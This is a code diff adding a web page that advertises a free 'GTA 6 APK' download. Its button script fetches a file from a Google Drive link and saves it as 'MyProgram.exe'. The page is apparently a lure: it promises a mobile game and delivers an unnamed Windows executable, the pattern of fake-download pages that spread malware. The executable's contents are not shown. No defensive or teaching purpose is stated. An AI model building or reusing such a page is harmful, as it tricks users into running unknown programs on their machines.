@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GTA 6 FREE Download</title>
+</head>
+<body>
+  <h1>Download GTA6 APK</h1>
+<button class="circle button" id="downloadBtn">Download GTA 6 APK FOR FREE</button>
+<style>
+.circle-btn {
+  background-color: #007bff;
+  color: white;
+  width: 60px;
+  height: 60px;
+  border: none;
+  border-radius: 50%; 
+  font-size: 24px;
+  cursor: pointer;
+}
+.circle-btn:hover {
+  background-color: #0056b3;
+}
+</style>
+
+  <script>
+    document.getElementById('downloadBtn').addEventListener('click', () => {
+      const exeUrl = 'https://drive.google.com/uc?export=download&id=1AiX2vUM7OCvB5Hb_pcgxnP4wEy6zsfYy';
+      const link = document.createElement('a');
+      link.href = exeUrl;
+      link.download = 'MyProgram.exe'; 
+      link.click();
+    });
+  </script>
+</body>
+</html>
